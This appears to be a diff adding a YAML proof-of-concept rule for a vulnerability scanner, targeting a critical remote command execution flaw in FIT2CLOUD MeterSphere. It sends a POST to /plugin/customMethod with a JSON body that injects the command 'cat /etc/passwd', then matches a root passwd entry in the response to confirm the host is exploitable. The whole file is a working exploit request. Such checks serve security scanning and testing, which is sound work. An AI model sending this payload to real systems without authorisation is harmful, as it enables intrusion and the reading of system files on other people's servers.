@@ -1,0 +1,19 @@
+name: yaml-poc-fit2cloud-metersphere-other-CT-416542
+binding: 911a00b0-c5eb-42ae-bdcb-9f24a54a0fc9
+detail:
+    author: system_user
+    vulnerability:
+        id: 603c01fd-74af-4d88-8c7c-aa43da15d60b
+        level: critical
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /plugin/customMethod
+            headers:
+                Content-Type: application/json
+            body: '{"entry": "Evil", "request": "cat /etc/passwd"}'
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
